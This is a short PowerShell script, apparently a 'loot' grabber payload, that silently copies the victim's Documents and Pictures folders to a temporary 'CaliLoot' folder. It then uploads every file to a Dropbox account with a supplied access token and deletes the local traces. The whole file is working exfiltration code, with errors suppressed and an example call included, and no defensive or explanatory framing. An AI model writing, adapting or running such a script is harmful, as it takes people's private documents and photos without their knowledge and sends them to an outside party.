function Get-PicDoc {
    param (
        [Parameter(Mandatory = $true)]
        [string]$DropBoxAccessToken
    )

    $TempFolderPath = Join-Path $env:TEMP 'CaliLoot'

    $headers = @{ "Authorization" = "Bearer $DropBoxAccessToken"; "Content-Type" = 'application/json' }
    Invoke-RestMethod -Uri https://api.dropboxapi.com/2/files/create_folder_v2 -Method Post -Headers $headers -Body '{ "path": "/CaliLoot", "autorename": false }' | Out-Null

    # Copy folders and upload files to Dropbox
    $copyFolders = @('MyDocuments', 'MyPictures')
    $copyFolders | ForEach-Object {
        $sourcePath = Join-Path ([Environment]::GetFolderPath($_)) '*'
        $folderName = $_ -replace 'My', ''
        $targetPath = "/CaliLoot/$folderName"
        Copy-Item $sourcePath $TempFolderPath -Recurse -ErrorAction SilentlyContinue
        Get-ChildItem $TempFolderPath -File -Recurse | ForEach-Object {
            $filePath = $_.FullName
            $targetFilePath = "$targetPath/$($_.Directory.Name)/$($_.Name)"
            $arg = '{ "path": "' + $targetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
            $headers = @{ "Authorization" = "Bearer $DropBoxAccessToken"; "Dropbox-API-Arg" = $arg; "Content-Type" = 'application/octet-stream' }
            Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $filePath -Headers $headers | Out-Null
        }
    }

    Remove-Item $TempFolderPath -Recurse -Force
}

# Example usage:
$DropBoxToken = "YOUR DROPBOX TOKEN HERE"
Get-PicDoc -DropBoxAccessToken $DropBoxToken
